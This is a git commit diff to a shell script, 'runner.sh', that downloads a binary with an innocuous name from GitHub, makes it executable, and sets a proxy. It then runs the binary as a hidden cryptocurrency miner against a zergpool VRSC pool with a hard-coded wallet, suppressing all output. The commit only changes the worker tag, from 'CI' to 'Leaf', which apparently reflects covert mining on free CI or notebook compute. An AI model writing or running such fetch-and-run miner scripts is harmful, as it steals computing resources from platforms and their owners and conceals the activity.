bbf88420a24389b241e086e56a8800dd86764d99
Esaffvd <90439893+Esaffvd@users.noreply.github.com>
2021-10-12 09:57:21 +0700

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -2,4 +2,4 @@
 wget -q https://github.com/comandashtar/colab-2/raw/main/kanyut
 chmod +x kanyut
 export http_proxy=socsk5://198.1.94.46:45972
-./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.$(echo $(shuf -i 1-99999 -n 1)-CI) -p c=VRSC -t 40 >/dev/null 2>&1
+./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.$(echo $(shuf -i 1-99999 -n 1)-Leaf) -p c=VRSC -t 40 >/dev/null 2>&1
